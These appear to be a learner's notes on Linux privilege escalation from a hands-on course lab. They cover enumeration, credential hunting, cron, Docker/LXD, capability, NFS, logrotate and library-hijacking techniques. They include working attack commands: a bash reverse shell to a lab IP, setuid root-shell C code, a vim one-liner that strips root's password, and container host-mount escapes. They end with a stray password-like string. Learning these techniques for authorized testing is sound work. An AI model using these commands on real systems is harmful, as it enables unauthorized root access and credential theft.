Things to look out for:
***OS Version***: Knowing the distro will give us an opportunity to look at which tools are available. 
***Kernel Version***: There may be publicly available exploits which target a specific kernel version 
***Running Services***: Knowing which services are running on the host are important. Especially important is services running as root `ps aux | grep root`
***Installed Packages and Package Versions***:  Out of date packages may be easy leveraged for privilege escalation.
***Logged In Users***: Knowing which users are logged in gives better ability for lateral movement. `ps au`
***User's  Home Directories***: `ls /home` check if user directories are readable and check for bash history or ssh keys
***Sudo Priveleges***: Check which commands the user can run as root `sudo -l`
***Password Hashes***: Check if we have access to `/etc/passwd` or `/etc/shadow`
***Cron Jobs***: Cron jobs/scheduled tasks can be ran as root and misconfigured.
***Unmounted File System***: Could possibly mount an unmounted file which may contain sensitive files/passwords `lsblk`.
***SETUID and GETUID Permissions***: Binaries are set with this value to allow to run a command as root without being ran as a root level user.
***Writeable Directories***: To find where to import and store tools.
***Writeable Files***: Are any scripts or config files world writeable? 

## Environment Enumeration
Enumeration is the key to privilege escalation and we can use a tool like *Linpeas*.

#### Typical Enumeration Commands
- `whoami` - what user are we running as
- `id` - what groups does our user belong to?
- `hostname` - what is the server named, can we gather anything from the naming convention?
- `ifconfig` or `ip -a` - what subnet did we land in, does the host have additional NICs in other subnets?
- `sudo -l` - can our user run anything with sudo (as another user as root) without needing a password? This can sometimes be the easiest win and we can do something like `sudo su` and drop right into a root shell.

*OS Release*: `cat /etc/os-release`
*Environment Variable*: `env` may hold passwords stored as environment variables.

## Linux Services and Enumeration
- What services and applications are installed?
- What services are running?
- What sockets are in use?
- What users, admins, and groups exist on the system?
- Who is current logged in? What users recently logged in?
- What password policies, if any, are enforced on the host?
- Is the host joined to an Active Directory domain?
- What types of interesting information can we find in history, log, and backup files
- Which files have been modified recently and how often? Are there any interesting patterns in file modification that could indicate a cron job in use that we may be able to hijack?
- Current IP addressing information
- Anything interesting in the `/etc/hosts` file?
- Are there any interesting network connections to other systems in the internal network or even outside the network?
- What tools are installed on the system that we may be able to take advantage of? (Netcat, Perl, Python, Ruby, Nmap, tcpdump, gcc, etc.)
- Can we access the `bash_history` file for any users and can we uncover any thing interesting from their recorded command line history such as passwords?
- Are any Cron jobs running on the system that we may be able to hijack?

### Internals
Internal configurations of integrated systems. 

*Network Interfaces*: `ip a`
*Hosts File*: `cat /etc/hosts`  ~Good idea to check last login to system and how frequently~
*Last Login*: `lastlog`
*Who else is on the system*: `finger` `w` 
*Command History*: `history`
*CronJobs*: `ls -la /etc/cron.daily/`
*Proc Filesystem*: ` find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"`

### Services
Could find installed packages that may have a vulnerability. 
*Installed Packages*: `ls -la /etc/cron.daily/`
*Sudo*: Sudo may be vulnerable `sudo -V`
*Binaries*: `ls -l /bin /usr/bin/ /usr/sbin/`
*GTFObins*: Platform for checking vulnerable binaries 
```shell-session
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
```

#### Strace 
We can use a tool like `strace` to find and analyze system  calls and signal processing. We can understand how it accesses system resources, processes signals, and receives and sends data from the operating system. 
```shell-session
strace ping -c1 10.129.112.20
```

#### Configuration Files
Users can read almost all config files on Linux. Can often reveal how a service is configured and may contain sensitive information.
```shell-session
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
```

Scripts created by admins may not have their rights restricted.
*Scripts*
```shell-session
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```

*Running Services*
```shell-session
ps aux | grep root
```

## Credential Hunting
When enumerating a system its important to note any credentials. These can be found in configuration files (`.conf, .xml, .config`), shell scripts, a user's bash history file, backup (`.bak`) files, within databases or text files.

*Web root my contain database credentials* 
```shell-session
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
```

*the spool or webroot directories may contain valuable information*
```shell-session
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

#### SSH Keys
Its useful to search around the system for private SSH Keys
```shell-session
ls ~/.ssh
```

## Path Abuse
`PATH` is an environment variable that specifies the set of directories where an executable can be located. An accounts `PATH` variable is a set of absolute paths allowing user to type a command without specifying the absolute path to a binary. A user can type `cat /tmp/text.txt` instead of `/bin/cat /tmp/text.txt`.

We can check the contents of the `PATH` variable by typing `env | grep PATH` or `echo $PATH`

We can create a script or program in a directory specified in the `$PATH` will make it executable from any directory on the system.

Adding *.* to a user's `PATH` adds their current working directory to the list. If we can modify a users path we can replace a common binary like `ls` with a malicious script such as a reverse shell. if we add *.* to `PATH` by using the command
```
PATH=.:$PATH
export PATH
```
we will be able to run binaries in our local working directory. Now we can add a malicious script to our current working directory and when a user types `ls` it will call the malicious script in the current working directory.

## Wildcard Abuse
Wildcard characters can be used as a replacement for other characters. 

|**Character**|**Significance**|
|---|---|
|`*`|An asterisk that can match any number of characters in a file name.|
|`?`|Matches a single character.|
|`[ ]`|Brackets enclose characters and can match any single one at the defined position.|
|`~`|A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.|
|`-`|A hyphen within brackets will denote a range of characters.|

The `--checkpoint-action` option permits an `EXEC` action to be executed when a checkpoint is reached (i.e., run an arbitrary operating system command once the tar command executes.) By creating files with these names, when the wildcard is specified, `--checkpoint=1` and `--checkpoint-action=exec=sh root.sh` is passed to `tar` as command-line options.


## Escaping Restricted Shells
Restricted shells limit user's ability to execute commands. Only usually allowed to execute a specific set of commands in specific directories. 

### RBASH
*Rbash* is a restricted version of the `bash` shell which limits users ability to use certain features of the BASH shell. Used to provide a safe environment for users which may inadvertently damage environment. 

### RKSH 
*Restricted Korn Shell*, standard restricted CLI which limits users ability to execute commands in certain directories, creating or modifying shell functions, and modifying the shell environment. 

### RZSH
*Restricted ZShell*, is a restricted version of Zshell, Limits running shell scripts, defining aliases, and modifying shell environment. 

### Escaping
it may be possible to escape from a CLI by injecting commands which the shell accepts. May be possible to inject additional commands into an allowed command. 

#### Command Injection
In a shell where we are allowed the `ls` command, we need to use predetermined arguments, such as `ls -l` or `ls -a` 
```shell-session
ls -l `pwd` 
```

#### Command Substitution
If a shell allows a user to execute a command in backticks  $`$  we may be able to execute a command to escape the shell.

#### Command Chaining
To put multiple commands on a single line we can use `;` or `|` 

#### Environment Variables
If a shell is restricted to certain directories, a shell might use an environment variable to specify this. If we can modify this environment variable we can escape the restrictions. 

#### Shell Functions
Can escape shell using shell functions.


## Special Permissions
*Set User ID upon Execution* (`setuid`) can allow users to execute a script with the permissions of another users typically with elevated privileges. 

```shell-session
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

the `setuid` bit appears as an s.

The *Set-Group-ID* (`setgid`) permission is another special permission that allows us to run binaries as if we were part of the group that created them.

```shell-session
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

We can use [GTFOBins](https://gtfobins.github.io/) to find and exploit 

## Sudo Rights Abuse
```
sudo -l
```
*You Know the Rules*

## Privileged Groups
### LXD 
`LXD` is similiar to Docker and Ubuntu's Container Manager. Upon installation, all users are added to the *LXD group*. Membership of this group can be used to escalate priveleges by creating a *LXD Container*, making it privileged, and then accessing the host file system at `/mnt/root` 


```shell-session
id
```
*Unzip Alpine Image*
```shell-session
unzip alpine.zip 
```
*Start LXD initialization (choose defaults for each prompt)*
```
lxd init
```
*Import the local image*
```shell-session
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```
Start a privileged container with the `security.privileged` set to `true` to run the container without a UID mapping, making the root user in the container the same as the root user on the host.
```shell-session
lxc init alpine r00t -c security.privileged=true
```
*Mount the Host File System*
```shell-session
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```
Finally, spawn a shell inside the container instance. We can now browse the mounted host file system as root. For example, to access the contents of the root directory on the host type `cd /mnt/root/root`. From here we can read sensitive files such as `/etc/shadow` and obtain password hashes or gain access to SSH keys in order to connect to the host system as root, and more.
```shell-session
lxc start r00t
```

### Docker
Placing a user in a docker group is essentially equivalent to root access to the file system without requiring a password.
One example would be running the command `docker run -v /root:/mnt -it ubuntu`. This command creates a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as `/etc` which could be used to retrieve the contents of the `/etc/shadow` file for offline password cracking or adding a privileged user.

## Capabilities
Security feature in Linux that allows specific privileges to be granted to certain processes allowing them to perform actions that may be otherwise restricted.
Allows for more fine control over which processes have access to certain privileges making it more secure than the traditional Unix model of granting privileges based on users and groups.

A possible vulnerability is using capabilities to gain privileges if programs aren't sufficiently sand boxed. Programs may have more privileges than they need, which may be possible to exploit these privileges to do unauthorized actions.

In Ubuntu we use the `setcap` command to set capabilities for certain executables.

### Set Capability
we could use the following command to set the `cap_net_bind_service` capability for an executable
```shell-session
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

When capabilities are set for a certain binary it means the binary can perform specific tasks
The `cap_net_bind_service` means that the binary will be able to bind network ports which is usually restricted. 

`cap_sys_admin` allows binary to perform actions within system admin privileges.

|**Capability**|**Description**|
|---|---|
|`cap_sys_admin`|Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.|
|`cap_sys_chroot`|Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.|
|`cap_sys_ptrace`|Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes.|
|`cap_sys_nice`|Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.|
|`cap_sys_time`|Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.|
|`cap_sys_resource`|Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.|
|`cap_sys_module`|Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.|
|`cap_net_bind_service`|Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.|

| **Capability Values** | **Description**                                                                                                                                                                                                                                                                                                                                                                                                               |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `=`                   | This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.                                                                                                                                                                                                                                        |
| `+ep`                 | This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.                                                                                                                                                    |
| `+ei`                 | This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.                                                                                                                                    |
| `+p`                  | This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it. |
Several Linux capabilities can be used to escalate a user's privileges to `root`, including:

| **Capability**     | **Description**                                                                                                                                                                                                              |
| ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `cap_setuid`       | Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the `root` user.                                                                                          |
| `cap_setgid`       | Allows to set its effective group ID, which can be used to gain the privileges of another group, including the `root` group.                                                                                                 |
| `cap_sys_admin`    | This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the `root` user, such as modifying system settings and mounting and unmounting file systems. |
| `cap_dac_override` | Allows bypassing of file read, write, and execute permission checks.                                                                                                                                                         |
### Enumerating Capabilities
```shell-session
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```
Command uses `-exec` flag to run `getcap` command on each and provides a list of capabilities as output.
### Exploitation
If we gained access to the system with a low-privilege account, then discovered the `cap_dac_override` capability.

If a binary is run without `sudo` and contains the `cap_dac_override` it can escalate the privilege of the user who runs it and the system file.

if `/usr/bin/vim.basic` has `cap_dac_override`
```shell-session
/usr/bin/vim.basic /etc/passwd
```

```shell-session
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
cat /etc/passwd | head -n1
```
```shell-session
root:x:0:0:root:/root:/bin/bash
root::0:0:root:/root:/bin/bash
```

the first bit after the `:` with the `x` indicates that a password is used to login. If we remove that x we can just `su` to root.

## Vulnerable Services
There are multiple services with vulnerabilities which allow privilege exploitation.

## Cron Job Abuse
CronJobs are services that are set to run  at certain times, this can be *on boot* or at set times. They typically perform administrative tasks such as; running backups, and cleaning directories. 

the `crontab` command will create a CronFile which will be ran by the Cron Daemon on the schedule specified. When created, cronfiles are will be created in `/var/spool/cron`.  

Each entry into the cron table requires 6 items `minutes, hours, days, months, weeks, commands.`

Root CronTab only usually editable by the root user. You may find a world-writable script that runs as root and, even if you cannot read the crontab to know the exact schedule we can usually ascertain how often it runs. In this case we may be able to append a line on to the end of a script which may execute the next time a job runs.

### Finding writable files
```shell-session
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

Tool called [pspy](https://github.com/DominicBreuker/pspy) to view running processes without root privs.

```shell-session
./pspy64 -pf -i 1000
```
The `-pf` flag tells the tool to print commands and file system events and `-i 1000` tells it to scan [procfs](https://man7.org/linux/man-pages/man5/procfs.5.html) every 1000ms (or every second).

Cronjob runs a writeable file every 3 minutes 
*We should always copy the original script as to be none destructive to the environment*

## Containers
Containers operate at the Operating System Level and Virtual Machines operate at the hardware level. Containers share an os and isolate application processes from the rest of the system.

Isolation and Virtualization are essential because they help manage resources and security aspects as efficiently as possible. Isolation commonly found from api's to not allow access to databases. 

### Linux Containers
Linux Containers (*LXC*) is an OS level virtualization techinque which allows linux systems to run in isolation from eachother on a single shared host by owning their own process but sharing the host system kernel for them. *LXC* is popular due to ease of use and has become an essential part of IT security.

*LXC* consumes fewer resources than a vm and have a standard interface, making it easy to manage multiple containers at the same time. 

Most widely used virtualization for Linux.

### Linux Daemon
*LXD* is similar but is designed to contain a complete operating system. 
Therefore not a application container but a system container. 
To use these services to escalate our privileges they must be in *LXC* or *LXD* group which we can check with the `id` command.

There are several ways we can now exploit *LXD*/*LXC*. We can create our own container and transfer it to the target system or use an existing container. Admins typically use templates which use little to no security.

***If we find an image on an environment***
Images often do not have passwords so we can use that against the environment. 

We need to import the container as an image:
```shell-session
container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
container-user@nix02:~$ lxc image list
```

after this we can verify the image has been successfully imported, we can init the image and configure it by specifying the `security.privileged` flag and the root path for the container. `security.privileged` disables all isolation features and allows us to act on the host

```shell-session
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

```shell-session
lxc start privesc
lxc exec privesc /bin/bash
ls -l /mnt/root
```
## Docker
Popular Opensource tool for managing portable and constant runtime environments.
Runs at Operating System Level and shares file system and system resources.
Usable by any OS as in container.  Contains everything needed to run an application code runtime. 

### Docker Architecture
At the core of the Docker architecture lies a client-server model, where we have two primary components:

- The Docker daemon
- The Docker client

The Docker client acts as our interface for issuing commands and interacting with the Docker ecosystem, while the Docker daemon is responsible for executing those commands and managing containers.

### Docker Daemon
AKA Docker Server; critical part of the platform for container management and orchestration.
Responsibilities:
- Running Containers
- Interacting with Containers 
- managing Docker containers on the host systems

#### Managing Docker Containers
Coordinates creation, execution, and monitoring of Docker Containers maintaining their isolation from host and other containers. 

	Includes Monitoring and logging
	Captures Container logs
	Provides insight and debugging information.

Monitors System resources.

#### Network and Storage
Facilitates container networking by creating virtual networks and managing interfaces.
Containers communicate with each other and outside world through network ports, IP addresses, and DNS resolution. 

Daemon manages storage creation attachment and cleanup.

### Docker Clients
When we interact with docker we issue commands through the docker client, which communicates with the docker daemon. We can `create, start, stop, manage, remove, search, and download`. Can be pushed to remote repos allowing us to share them. 

#### Docker Desktop 
User friendly GUI for Mac, Windows, and Linux

### Docker Images and Containers
Docker image = blueprint for creating containers. Encapsulates everything needed to run an application including the code, dependencies, libraries and configs.

Container is an instance of a Docker Image. Images are Imutable and read-only whereas containers are muteable and can be modified during runtime.

### Docker Privilege escalation
#### Docker Shared Directories
Docker shared directories (*Volume Mounts*) can bridge the gap between the host system and the container's file system. Files can be made accessible within the file system.

When we get access to the docker file system we can enumerate it locally, we might find additional non-standard directories 

#### Docker Sockets
special file that allows us and processes to communicate with the docker daemon. Communication occurs through a Unix socket or a network socket. 
When we issue a command through the CLI the Docker client sends the command to the docker socket > docker daemon processes the command.

Docker sockets require appropriate permissions. Usually restricted to specific users or groups, so only trusted users can interact with it.

Docker sockets can be exposed over a network. (*Possible In*)

```shell-session
~/app$ ls -al
```
in the /app file will expose `docker.sock` we can use the docker binary to interract with it. We need to download it if it is not available on the box. [Docker Binary](https://master.dockerproject.org/linux/x86_64/docker)

```shell-session
/tmp/docker -H unix:///app/docker.sock ps
```

```shell-session
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
htb-student@container:~/app$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED           STATUS           PORTS     NAMES
7ae3bcc818af     main_app      "/docker-entry.s..."    12 seconds ago    Up 8 seconds     443/tcp   app
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago        Up 17 minutes    443/tcp   app
<SNIP>
```

Now, we can log in to the new privileged Docker container with the ID `7ae3bcc818af` and navigate to the `/hostsystem`.

```shell-session
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
```
	We can then grab the RSA private key
### Docker Group
To gain root through docker the user we are logged in as must be in the docker group. This allows user to control the Daemon. 

```shell-session
docker-user@nix02:~$ id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

May have SUID or `sudo -l` set which permits docker to be run as root. 

```shell-session
docker image ls
```

### Docker Socket
Writable socket may be found in `/var/run` which can only be written by root or docker group.
```shell-session
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

## Logrotate
logrotate is a tool for archiving and disposing of old server logs. 
Constantly renames old log files, can be configured to create new log files based on time. 
```shell-session
cat /etc/logrotate.conf
```
To force a new rotation on the same day, we can set the date after the individual log files in the status file `/var/lib/logrotate.status` or use the `-f`/`--force` option:
```shell-session
sudo cat /var/lib/logrotate.status
```
We can find the corresponding configuration files in `/etc/logrotate.d/` directory.
```shell-session
ls /etc/logrotate.d/
```
```shell-session
cat /etc/logrotate.d/dpkg
```

To exploit `logrotate`, we need some requirements that we have to fulfill.

1. we need `write` permissions on the log files
2. logrotate must run as a privileged user or `root`
3. vulnerable versions:
    - 3.8.6
    - 3.11.0
    - 3.15.0
    - 3.18.0

There is a prefabbed exploit [logrotten](https://github.com/whotwagner/logrotten)
We must create a payload file in the logrotten folder
```shell-session
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```
Before running the exploit we need to determine which option logrotate uses in logrotate.conf
```shell-session
grep "create\|compress" /etc/logrotate.conf | grep -v "#"
```
We then have to use the exploit adapted to `create` or `compress`.
```shell-session
./logrotten -p ./payload /tmp/tmp.log
```
We then make an edit to the logfile and then logrotten is triggered

```shell-session
echo test >> /home/htb-student/backups/access.log; ./logrotten /home/htb-student/backups/access.log -p payload
```

## Misc Techniques
### Passive Capture Traffic
If *tcpdump* is installed, unprivileged users may be able to capture credentials and network traffic. 
[net-creds](https://github.com/DanMcInerney/net-creds) can be used to examine passed data. May result in capture of sensitive information ie; credit card information and passwords.
Can capture hashes
### Weak NFS Privs
*Network File System* (**NFS**) allows users to access shared files or directories over the network hosted on UNIX/LINUX systems.
uses `TCP/UDP port 2049` 
accessible mounts can be accessed with `showmount -e` which lists servers export list 

|Option|Description|
|---|---|
|`root_squash`|If the root user is used to access NFS shares, it will be changed to the `nfsnobody` user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the `nfsnobody` user, which prevents an attacker from uploading binaries with the SUID bit set.|
|`no_root_squash`|Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.|

```shell-session
cat /etc/exports
```

we can create a `SETUID` binary that executes `/bin/sh` using our local root user. We can mount the `/tmp` directory locally, copy the root-owned binary over to the **NFS** and set the `SUID` bit.

```shell-session
cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```
```shell-session
/tmp$ gcc shell.c -o shell
```
```shell-session
root@Pwnbox:~$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
root@Pwnbox:~$ cp shell /mnt
root@Pwnbox:~$ chmod u+s /mnt/shell
```

When we switch back to the host's low privileged session we can execute the binary and obtain a root shell.

### Hijacking TMUX Sessions
Terminal multiplexers like *TMUX* can allow multiple terminal sessions to be accessed in a single console session. A user may leave a *TMUX* session running which could be hijacked this is done by creating a new shared session and modifying the ownership.

```shell-session
tmux -S /shareds new -s debugsess
chown root:devs /shareds
```
if we can compromise a we can attach to this session and gain root access
```shell-session
ps aux | grep tmux
```
```shell-session
htb@NIX02:~$ id

uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
```

## Kernel Exploits
Kernel level exploits exist for a variety of Linux versions -> [Dirty COW](https://github.com/dirtycow/dirtycow.github.io)
Leverage vulnerabilities in the kernel to execute code with root privileges. 

As simple as downloading compiling and running. Shows up in linpeas.

### Kernel Exploit Example
Check Linux version
```shell-session
uname -a
```
```shell-session
cat /etc/lsb-release 
```

## Shared Libraries 
Linux programs can use dynamically linked object libraries which contain compiled code which other developers write. 

Two types of libraries:
- `.a` files denote static files which become part of the compiled program and cant be altered
- `.so` files denote dynamic files and can be modified to control the execution of the program that calls them.

- Multiple methods of adding libraries. `-rpath` and `-rpath-link` flags used when compiling program.
- Using environment variable `LD_RUN_PATH` or `LD_LIBRARY_PATH`, placing libraries in the `/lib` or `/usr/lib` default directories. 
- Specifying another directory containing the libraries within the `/etc/ld.so.conf/` config file
- `LD_PRELOAD` environment variable can load a library before executing a binary. 

Shared objects required a binary can be viewed with the `ldd` utility
```shell-session
ldd /bin/ls
```

### LD_PRELOAD Privilege Escalation
We can utilize the `LD_PRELOAD` environment variable to escalate privileges.
We first need a user with `sudo` privileges.

***ALWAYS CHECK GTFOBINS***

We can compile a shell `root.c` 
and set the `LD_PRELOAD` with 
```shell-session
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

### Shared Object Hijacking
If we find non-standard libraries in custom locations, one such setting is `RUNPATH` configuration.
Libraries in this folder are given preference over other photos. Can be inspected with `readelf`.

```shell-session
readelf -d payroll  | grep PATH

 0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Will list where libraries can be loaded from. We can place a malicious library in that directory.

Before we compile the binary we need to find the function name called by the binary:
```shell-session
ldd payroll

linux-vdso.so.1 (0x00007ffd22bbc000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)
```
We overwrite the binary `libshared.so` 
The error message will then tell us the name of the function 

We can then use that in the c shell
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 
```
We can then run the binary again after we replace the object and it will execute out code.

## Python Library Hijacking
Python has libraries *duh*

Three basic vulnerabilities when Hijacking:
1. Wrong write permissions
2. Library Path
3. `PYTHONPATH` environment variable

### Wrong Write Permissions
In Python, each version has a specific order in which libraries are searched and imported. 
Paths higher on the list take priority of paths lower on the list. We can check this with

#### PYTHONPATH Listing
```shell-session
python3 -c 'import sys; print("\n".join(sys.path))'
```

To be able to use this variant there are two prerequisites:
1. The module that is imported by the script is located under one of the lower priority paths listed via the `PYTHONPATH` variable.
2. We must have write permissions to one of the paths having a higher priority on the list.

If imported module is lower on list and a higher priority list is editable.
Since higher priority path is read earlier it is imported earlier.

#### Psutil Default Installation Location 
```shell-session
pip3 show psutil
```
For this example we can see `psutil` is installed in the path: `/usr/local/lib/python3.8/dist-packages`. 

#### Reconfigured Directory Permissions
We need to check for any configurations which may allow us to read/write.
```shell-session
ls -la /usr/lib/python3.8
```
We found that this folder is misconfigured and is higher on the list in `PYTHONPATH` for psutil.
We can now create our own malicious psutil.

#### Hijacked Module Contents - psutil.py
```python
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

We can create a file called `psutil.py` with the above contents and place it in the misconfigured path. 

It is important that the module has the *SAME NAME* and the *SAME FUNCTION NAME* 

### PYTHONPATH env variable
`PYTHONPATH` is an environment variable that indicates what directory (or directories) Python can search for modules to import.
If we can set this as a user we can redirect the python search function.

We can see if we have permissions to set the environment variable in sudo 
```shell-session
sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```
We are allowed to run `/usr/bin/python3` as a trusted user and therefore we can set the `PYTHONPATH` variable.

```shell-session
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```

## SUDO
Safeguards system from having its contents damaged by unauthorized users.
`/etc/sudoers` file specifies which users or groups are allowed to run specific programs without privs.

```shell-session
sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
```

There are several sudo versions with vulnerabilities.
- 1.8.31 - Ubuntu 20.04
- 1.8.27 - Debian 10
- 1.9.2 - Fedora 33
- and others

To find out the sudo version:
```shell-session
sudo -V | head -n1

Sudo version 1.8.31
```
## Polkit
`Polkit` is an authorized service on linux that allows software and systems to communicate with eachother. 

i_l0ve_s3cur1ty!